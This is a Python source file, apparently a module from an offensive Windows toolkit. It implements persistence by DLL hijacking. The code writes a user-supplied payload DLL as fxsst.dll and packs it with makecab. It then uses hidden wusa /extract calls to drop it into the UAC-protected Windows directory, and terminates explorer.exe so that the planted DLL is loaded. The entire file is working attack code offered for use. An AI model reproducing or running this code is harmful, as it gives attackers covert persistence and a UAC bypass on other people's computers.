import os
import wmi
import time
import tempfile
from core.prints import *

wmi = wmi.WMI()

def windows_directory():
	"""
	Get Windows directory
	"""
	try:
		for os in wmi.Win32_OperatingSystem():
			return os.WindowsDirectory
	except Exception as error:
		return False
		
def restart_explorer():
	"""
	Once the DLL is dropped we can either wait for a reboot
	or just kill the process and start it again
	"""
	try:
		for process in wmi.Win32_Process():
			if (process.Caption == "explorer.exe"):
				process.Terminate(process.ParentProcessId)
	except Exception as error:
		return False

def fax_dll(payload):
	print """
 -------------------------------------------------------------
 Persistence technique using dll hijacking, once explorer.exe
 starts it attempts to load fxsst.dll if the DLL is present
 in the Windows directory. The DLL needs to call LoadLibrary
 on itself, otherwise explorer.exe will crash.
 
 When everything worked correctly, we should gain persistence
 -------------------------------------------------------------
 """
 
	"""
	Save the DLL file to temp directory
	"""
	print_info("Payload: {}".format(payload))
	print_info("Attempting to read payload data")
	if (os.path.isfile(os.path.join(payload)) == True):
		try:
			payload_data = open(os.path.join(payload),"rb").read()
			print_success("Successfully read payload data")
		except Exception as error:
			print_error("Unable to read payload data")
			return False
		
		print_info("Attempting to save payload to: {}".format(tempfile.gettempdir()))
		try:
			dll_file = open(os.path.join(tempfile.gettempdir(),"fxsst.dll"),"wb")
			dll_file.write(payload_data)
			dll_file.close()
			print_success("Successfully saved payload in: {}".format(tempfile.gettempdir()))
		except Exception as error:
			print_error("Unable to save payload to disk")
			return False
	
	print_info("Pausing for 5 seconds before creating cabinet file")
	time.sleep(5)

	"""
	Create a cabinet file that we can use later for
	the DLL drop
	"""
	print_info("Attempting to create cabinet file")
	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True):
		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"fxsst.dll"),
							os.path.join(tempfile.gettempdir(),"suspicious.cab")),
							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
		
		time.sleep(5)

		if (makecab[1] == 0):
			print_success("Successfully created cabinet file in: {}".format(tempfile.gettempdir()))
			try:
				os.remove(os.path.join(tempfile.gettempdir(),"fxsst.dll"))
			except Exception as error:
				return False
		else:
			print_error("Unable to create cabinet file")
			return False
	else:
		print_error("Unable to create cabinet file, the payload is not present in: {}".format(tempfile.gettempdir()))
		return False
	
	print_info("Pausing for 5 seconds before extracting the cabinet file")
	time.sleep(5)

	"""
	We use the built-in feature wusa to extract our DLL file
	into UAC protected folders, this feature was removed in
	Windows 10
	"""
	print_info("Attempting to extract the cabinet file")
	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{} /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),windows_directory()),
							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
		
		time.sleep(5)

		if (wusa[1] == 0):
			print_success("Successfully extracted cabinet file")
			try:
				os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))
			except Exception as error:
				return False
		else:
			print_error("Unable to extract cabinet file")
			return False
	else:
		print_error("Unable to extract cabinet file, the cabinet file is not present in: {}".format(tempfile.gettempdir()))
		return False
		
	"""	
	Check if our DLL file is present in the Windows directory
	"""
	if (os.path.isfile(os.path.join(windows_directory(),"fxsst.dll")) == True):
		if (restart_explorer() == None):
			print_success("We should now have persistence on system")
		else:
			print_error("Unable to restart explorer process, we get persistence once the system reboots")
	else:
		print_error("Unable to get persistence on system, file copy failed")
		return False
